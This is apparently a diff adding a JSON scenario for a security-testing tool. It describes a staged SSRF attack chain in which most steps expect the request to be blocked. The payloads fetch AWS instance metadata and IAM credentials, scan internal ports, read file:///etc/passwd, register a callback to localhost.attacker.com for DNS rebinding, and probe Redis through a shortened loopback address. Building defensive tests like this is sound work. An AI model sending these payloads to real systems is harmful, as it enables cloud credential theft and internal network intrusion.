@@ -1,0 +1,180 @@
+{
+  "id": "ssrf-cloud-metadata",
+  "name": "SSRF Cloud Metadata Exploitation",
+  "category": "Server-Side Attacks",
+  "difficulty": "Expert",
+  "description": "Server-Side Request Forgery targeting cloud metadata services, internal networks, and backend systems",
+  "steps": [
+    {
+      "id": "ssrf-recon-1",
+      "name": "URL Parameter Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/fetch",
+        "params": {
+          "url": "https://httpbin.org/get"
+        }
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "ssrf-recon-2",
+      "name": "Response Analysis",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/test",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "callback_url": "https://httpbin.org/post",
+          "payload": "test"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "dependsOn": [
+        "ssrf-recon-1"
+      ]
+    },
+    {
+      "id": "ssrf-exploit-1",
+      "name": "AWS Metadata Service Access",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/fetch",
+        "params": {
+          "url": "http://169.254.169.254/latest/meta-data/"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-recon-2"
+      ]
+    },
+    {
+      "id": "ssrf-exploit-2",
+      "name": "Internal Network Scanning",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/proxy/request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "target": "http://127.0.0.1:22",
+          "method": "GET"
+        }
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-exploit-1"
+      ]
+    },
+    {
+      "id": "ssrf-exploit-3",
+      "name": "Protocol Smuggling",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/check-url",
+        "params": {
+          "url": "file:///etc/passwd"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-exploit-2"
+      ]
+    },
+    {
+      "id": "ssrf-exploit-4",
+      "name": "DNS Rebinding Preparation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/register",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "callback_url": "http://localhost.attacker.com/internal",
+          "event": "user_signup"
+        }
+      },
+      "execution": {
+        "delayMs": 3500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-exploit-3"
+      ]
+    },
+    {
+      "id": "ssrf-exploit-5",
+      "name": "Bypass with URL Encoding",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/fetch",
+        "params": {
+          "url": "http://127.1:6379/info"
+        }
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-exploit-4"
+      ]
+    },
+    {
+      "id": "ssrf-exfil-1",
+      "name": "Cloud Credentials Extraction",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/fetch",
+        "params": {
+          "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ssrf-exploit-5"
+      ]
+    }
+  ]
+}
